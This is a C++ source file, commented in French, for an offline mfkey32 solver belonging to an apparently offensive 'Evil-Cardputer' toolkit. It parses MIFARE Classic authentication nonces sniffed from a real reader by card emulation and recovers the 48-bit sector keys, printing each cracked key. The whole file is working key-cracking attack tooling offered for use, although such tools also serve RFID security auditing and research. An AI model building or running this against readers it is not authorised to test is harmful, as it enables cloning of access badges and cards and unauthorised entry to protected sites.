// mfkey_solve — solveur offline mfkey32 pour Evil-Cardputer.
//
// Le Cardputer (Cap NFC -> "Emul MIFARE", mode 11) capture les nonces d'un
// lecteur MIFARE Classic et les journalise sur SD dans /evil/mfkey_nonces.txt,
// une ligne par nonce, au format EXACT :
//   cuid=%08X blk=%d key=%c nt=%08X nr=%08X ar=%08X
//
// Ce solveur (host, PC) lit ce fichier, groupe par (cuid, bloc, keyA/B), et
// pour chaque groupe d'au moins 2 nonces retrouve la clef 48 bits via mfkey32.
// Le solve pèse ~1-4 Mo de RAM transitoire : il tourne sur PC, pas sur le
// Cardputer (S3 sans PSRAM ici). La logique crypto est dans mfkey.h, partagée
// et validée par round-trip synthétique.
//
// Build : g++ -std=c++17 -O2 mfkey_solve.cpp -o mfkey_solve
// Usage : ./mfkey_solve [chemin_nonces.txt]   (défaut: mfkey_nonces.txt)

#include "mfkey.h"
#include <cstdio>
#include <cstring>
#include <cstdint>
#include <vector>
#include <string>
#include <map>

struct Nonce { uint32_t nt, nr, ar; };
// clef de groupe : cuid + bloc + type de clef (A/B)
struct GroupKey {
    uint32_t cuid; int blk; char key;
    bool operator<(const GroupKey& o) const {
        if (cuid != o.cuid) return cuid < o.cuid;
        if (blk  != o.blk)  return blk  < o.blk;
        return key < o.key;
    }
};

int main(int argc, char** argv) {
    const char* path = (argc > 1) ? argv[1] : "mfkey_nonces.txt";
    FILE* f = fopen(path, "r");
    if (!f) { fprintf(stderr, "Impossible d'ouvrir %s\n", path); return 1; }

    std::map<GroupKey, std::vector<Nonce>> groups;
    char line[256];
    int total = 0;
    while (fgets(line, sizeof(line), f)) {
        uint32_t cuid, nt, nr, ar; int blk; char key = 'A';
        // format écrit par nfc_mfemul_ui() sur le Cardputer
        if (sscanf(line, "cuid=%x blk=%d key=%c nt=%x nr=%x ar=%x",
                   &cuid, &blk, &key, &nt, &nr, &ar) == 6) {
            groups[{cuid, blk, key}].push_back({nt, nr, ar});
            total++;
        }
    }
    fclose(f);
    printf("Lu %d nonce(s) dans %d groupe(s) (cuid/bloc/clef).\n",
           total, (int)groups.size());

    int solved = 0;
    for (auto& g : groups) {
        const GroupKey& gk = g.first;
        std::vector<Nonce>& ns = g.second;
        if (ns.size() < 2) {
            printf("  cuid=%08X blk=%d key%c : %zu nonce, il en faut 2 -> présente à nouveau le lecteur\n",
                   gk.cuid, gk.blk, gk.key, ns.size());
            continue;
        }
        // Essaie des paires jusqu'à obtenir une clef unique confirmée.
        bool ok = false; uint64_t key = 0;
        for (size_t i = 0; i < ns.size() && !ok; i++)
            for (size_t j = i + 1; j < ns.size() && !ok; j++) {
                // deux nonces distincts (nt différents) sont nécessaires
                if (ns[i].nt == ns[j].nt) continue;
                if (mfk_mfkey32(gk.cuid,
                                ns[i].nt, ns[i].nr, ns[i].ar,
                                ns[j].nt, ns[j].nr, ns[j].ar, &key))
                    ok = true;
            }
        if (ok) {
            printf("  cuid=%08X blk=%2d key%c => %012llX  [OK]\n",
                   gk.cuid, gk.blk, gk.key, (unsigned long long)key);
            solved++;
        } else {
            printf("  cuid=%08X blk=%2d key%c => non résolu (%zu nonces, paires non concluantes)\n",
                   gk.cuid, gk.blk, gk.key, ns.size());
        }
    }
    printf("Terminé : %d/%d groupe(s) résolu(s).\n", solved, (int)groups.size());
    return 0;
}
